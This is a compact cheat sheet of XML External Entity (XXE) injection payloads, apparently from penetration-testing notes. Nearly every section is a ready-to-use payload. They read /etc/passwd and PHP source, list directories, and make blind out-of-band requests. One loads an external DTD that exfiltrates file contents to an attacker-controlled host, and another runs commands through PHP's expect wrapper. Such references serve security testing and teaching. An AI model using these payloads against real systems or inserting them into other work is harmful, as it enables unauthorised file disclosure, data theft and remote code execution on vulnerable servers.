## External XML Entity Injection

### Detect XXE

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe "test"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

### Include files

**Note**: You might need `file:///etc/passwd`

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

### List files (restricted to Java Applications)

```
<!--?xml version="1.0" ?-->
<!DOCTYPE aa[<!ELEMENT bb ANY>
<!ENTITY xxe SYSTEM "file:///">]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

### Blind XXE

#### Blind XXE Out-of-Band
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

#### Blind XXE Out-of-Band with XML parameter entitities:

```
<!DOCTYPE ase [ <!ENTITY % xxe SYSTEM "http://collaborator"> %xxe; ]>
```

### Read PHP source code with a base64 encode filter
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>test</title>
		<cwe>&xxe;</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

### Reading a file through a PHP error

```
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

### Load an external DTD:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://our-site.com/?x=%file;'>">
%eval;
%exfiltrate;
```

### Execute code

**Note:** Only works if the PHP `expect` module is available

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>
    <bar>&xxe;</bar>
</foo>
```





